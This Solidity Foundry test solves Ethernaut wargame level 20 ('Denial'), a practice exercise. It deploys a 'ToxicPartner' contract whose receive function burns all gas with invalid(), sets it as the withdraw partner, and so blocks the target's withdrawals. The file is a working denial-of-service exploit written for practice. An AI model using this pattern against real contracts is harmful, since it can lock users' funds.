// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract ToxicPartner {
    receive() external payable {

        assembly {
            invalid()
        }
    }
}

contract EthernautDenialTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6; 
    function testLevel20_Denial() public {

        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance{value: 0.001 ether}(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        console.log("Denial Contract Address:", levelAddr);

        IDenial target = IDenial(levelAddr);

        ToxicPartner toxic = new ToxicPartner();
        console.log("Toxic Partner Address:", address(toxic));

        target.setWithdrawPartner(address(toxic));

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}